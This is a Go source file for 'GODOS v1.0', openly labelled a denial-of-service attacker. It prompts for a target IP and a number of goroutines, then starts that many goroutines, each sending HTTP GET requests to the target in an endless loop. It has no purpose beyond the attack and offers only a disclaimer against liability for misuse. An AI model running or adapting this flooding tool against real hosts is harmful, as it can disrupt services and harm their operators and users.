// GODOS v1.0
// Denial of service attacker made in Go
// Made by https://github.com/BredSec/

package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strconv"
	"sync"
	"time"
)

func main() {
	var wg sync.WaitGroup

	var target string
	var goroutines int

	input := bufio.NewScanner(os.Stdin)

	fmt.Println("              GODOS v1.0")
	fmt.Println("            Made by: BredSec")
	fmt.Println("")
	fmt.Println("  Disclaimer: developers not liable for misuse")

	fmt.Print("Please enter the target IP: ")
	input.Scan()
	target = input.Text()

	fmt.Print("Please enter the number of goroutines: ")
	input.Scan()
	s1, _ := strconv.Atoi(input.Text())
	goroutines = s1

	fmt.Println("Starting goroutines...")
	i := 1
	for i < goroutines {
		wg.Add(1)
		go request(target)
		i++
	}

	fmt.Println("Sending HTTP requests...")
	wg.Wait()
}

func request(target string) {
	for true {
		http.Get(target)
		time.Sleep(1 * time.Second)
	}
}
